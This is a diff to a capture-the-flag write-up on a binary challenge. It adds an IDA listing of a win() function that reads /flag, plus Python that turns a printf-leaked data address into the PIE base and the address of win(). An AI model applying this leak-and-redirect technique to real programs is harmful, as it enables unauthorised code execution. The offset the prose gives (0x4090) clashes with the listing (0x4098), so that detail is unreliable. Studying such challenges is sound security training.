@@ -14385,7 +14385,7 @@ At `i = 0` (FizzBuzz), `src` is set to `&fuzzbuzz` by the branch.
 
 Looking at the IDA dump, we can see that the `&fuzzbuzz` string is at an offset of `0x4090` from the base of the binary.
 
-```asm title="/challenge/can-it-fizz :: .data"
+```asm title="/challenge/does-it-buzz :: .data"
 # ---- snip ----
 
 .data:0000000000004098                 public fuzzbuzz
@@ -14405,10 +14405,103 @@ So, if we leak the address of `&fuzzbuzz`, we can leak the address of the binary
 
 The same counter bridge trick applies: we send 24 A's followed by `p32(0xFFFFFFFF)`, `printf` spills the 6 non-NULL bytes of `&fuzzbuzz`, and the loop wraps again to `i = 0`.
 
+```asm title="/challenge/does-it-buzz :: win()"
+# ---- snip ----
+
+.text:00000000000012C9 ; =============== S U B R O U T I N E =======================================
+.text:00000000000012C9
+.text:00000000000012C9 ; Attributes: bp-based frame
+.text:00000000000012C9
+.text:00000000000012C9 ; int win()
+.text:00000000000012C9                 public win
+.text:00000000000012C9 win             proc near
+.text:00000000000012C9 ; __unwind {
+.text:00000000000012C9                 endbr64
+.text:00000000000012CD                 push    rbp
+.text:00000000000012CE                 mov     rbp, rsp
+.text:00000000000012D1                 lea     rdi, s          ; "You win! Here is your flag:"
+.text:00000000000012D8                 call    _puts
+.text:00000000000012DD                 mov     esi, 0          ; oflag
+.text:00000000000012E2                 lea     rdi, file       ; "/flag"
+.text:00000000000012E9                 mov     eax, 0
+.text:00000000000012EE                 call    _open
+.text:00000000000012F3                 mov     cs:flag_fd_5698, eax
+.text:00000000000012F9                 mov     eax, cs:flag_fd_5698
+.text:00000000000012FF                 test    eax, eax
+.text:0000000000001301                 jns     short loc_1350
+.text:0000000000001303                 call    ___errno_location
+.text:0000000000001308                 mov     eax, [rax]
+.text:000000000000130A                 mov     edi, eax        ; errnum
+.text:000000000000130C                 call    _strerror
+.text:0000000000001311                 mov     rsi, rax
+.text:0000000000001314                 lea     rdi, format     ; "\n  ERROR: Failed to open the flag -- %"...
+.text:000000000000131B                 mov     eax, 0
+.text:0000000000001320                 call    _printf
+.text:0000000000001325                 call    _geteuid
+.text:000000000000132A                 test    eax, eax
+.text:000000000000132C                 jz      short loc_1346
+.text:000000000000132E                 lea     rdi, aYourEffectiveU ; "  Your effective user id is not 0!"
+.text:0000000000001335                 call    _puts
+.text:000000000000133A                 lea     rdi, aYouMustDirectl ; "  You must directly run the suid binary"...
+.text:0000000000001341                 call    _puts
+.text:0000000000001346
+.text:0000000000001346 loc_1346:                               ; CODE XREF: win+63↑j
+.text:0000000000001346                 mov     edi, 0FFFFFFFFh ; status
+.text:000000000000134B                 call    _exit
+.text:0000000000001350 ; ---------------------------------------------------------------------------
+.text:0000000000001350
+.text:0000000000001350 loc_1350:                               ; CODE XREF: win+38↑j
+.text:0000000000001350                 mov     eax, cs:flag_fd_5698
+.text:0000000000001356                 mov     edx, 100h       ; nbytes
+.text:000000000000135B                 lea     rsi, flag_5697  ; buf
+.text:0000000000001362                 mov     edi, eax        ; fd
+.text:0000000000001364                 call    _read
+.text:0000000000001369                 mov     cs:flag_length_5699, eax
+.text:000000000000136F                 mov     eax, cs:flag_length_5699
+.text:0000000000001375                 test    eax, eax
+.text:0000000000001377                 jg      short loc_13A5
+.text:0000000000001379                 call    ___errno_location
+.text:000000000000137E                 mov     eax, [rax]
+.text:0000000000001380                 mov     edi, eax        ; errnum
+.text:0000000000001382                 call    _strerror
+.text:0000000000001387                 mov     rsi, rax
+.text:000000000000138A                 lea     rdi, aErrorFailedToR ; "\n  ERROR: Failed to read the flag -- %"...
+.text:0000000000001391                 mov     eax, 0
+.text:0000000000001396                 call    _printf
+.text:000000000000139B                 mov     edi, 0FFFFFFFFh ; status
+.text:00000000000013A0                 call    _exit
+.text:00000000000013A5 ; ---------------------------------------------------------------------------
+.text:00000000000013A5
+.text:00000000000013A5 loc_13A5:                               ; CODE XREF: win+AE↑j
+.text:00000000000013A5                 mov     eax, cs:flag_length_5699
+.text:00000000000013AB                 cdqe
+.text:00000000000013AD                 mov     rdx, rax        ; n
+.text:00000000000013B0                 lea     rsi, flag_5697  ; buf
+.text:00000000000013B7                 mov     edi, 1          ; fd
+.text:00000000000013BC                 call    _write
+.text:00000000000013C1                 lea     rdi, asc_210A   ; "\n"
+.text:00000000000013C8                 call    _puts
+.text:00000000000013CD                 nop
+.text:00000000000013CE                 pop     rbp
+.text:00000000000013CF                 retn
+.text:00000000000013CF ; } // starts at 12C9
+.text:00000000000013CF win             endp
+.text:00000000000013CF
+.text:00000000000013D0
+
+# ---- snip ----
+```
+
+We can see that the `win()` function is at an offset of `0x12c9` from the base of the binary.
+
+```
+win_addr = fuzzbuzz - 0x4090 + 0x12c9
+```
+
 ```python
 raw         = p.recvn(34)
-leaked_pie  = u64(raw[28:34] + b"\x00\x00")    # src = &fuzzbuzz
-binary_base = leaked_pie - FIZZ_OFFSET         # FIZZ_OFFSET = 0x4090
+fuzzbuzz    = u64(raw[28:34] + b"\x00\x00")    # src = &fuzzbuzz
+binary_base = fuzzbuzz - FIZZ_OFFSET           # FIZZ_OFFSET = 0x4090
 win_addr    = binary_base + WIN_OFFSET         # WIN_OFFSET  = 0x12c9
 ```
 
